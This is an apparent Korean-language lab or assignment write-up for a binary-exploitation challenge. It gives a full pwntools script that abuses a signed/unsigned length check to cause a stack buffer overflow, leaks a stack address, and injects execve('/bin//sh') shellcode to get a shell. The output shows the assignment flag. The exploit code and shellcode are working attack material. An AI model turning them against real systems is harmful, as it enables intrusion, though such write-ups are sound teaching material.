# **완성 전체 코드**

```python
from pwn import *

r = process('./super_safe.o')
# r = remote('221.149.226.120', 31337)

r.recvuntil(b'\n')

length = -1;
r.sendline(str(length))

r.recvuntil(b'stack : ')
leak = r.recvuntil(b'\n')[:-1]
leak = int(leak, 16)

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += b'b' * 8
ex += p32(leak)
r.send(ex)

r.recvuntil(b'b')

r.interactive()                              
```


# 설명

- `r.recvuntil(b'\n')` 코드로 `scanf(”%d”, &len)` 이전의 모든 printf된 것을 받아옴
- `r.sendline(str(length))` 에서  `scanf(”%d”, &len)` 에 해당하는 값을 넘겨주는데 `-1` 값을 입력값으로 줌
- -1값은 40보다 작은 수이므로 if문을 통과한다.
- input배열의 주소값을 얻어오는 printf문으로부터 주소값 직전의 출력값을 `r.recvuntil(b'stack : ')` 로 입력받고, `r.recvuntil(b'\n')[:-1]` 으로 마지막 값을 제외한 input주소값을 받아옴
- `read(0, input, len)` 값에서 len이 들어가는 부분은 `unsigned int` 와 같은 취급을 하는데, -1값을 넣었기 때문에 `integer bufferunderflow` 가 발생한다. 따라서 큰 정수 값으로 변화하므로 그 값만큼 자유롭게 입력을 받을 수 있게 되었다.
- 따라서 shellcode와 a로 이루어진 40바이트 크기의 문자열에 len과 SFP을 `stack buffer overflow` 로 덮을 수 있는 `b*8`을 추가하고 RET 에는 input배열의 주소값을 넣어준다.
- `r.send(ex)` 로 stack buffer overflow 를 발생시킨다.
- `printf("%s", input)` 의 결과값은 \n까지 출력이 되는데, 출력값을 정확하게 한정하기 위해 `b` 를 만날 때 까지의 결과만 받아온다.

```powershell
$ ./malicious
Congratulations!
Please enter your student ID, and I'll give you the flag.
$ 2018131321
Please copy and paste the following content into the report.
assignment1_flag{10783169968859744261902001500}
```

`flag = assignment1_flag{10783169968859744261902001500}`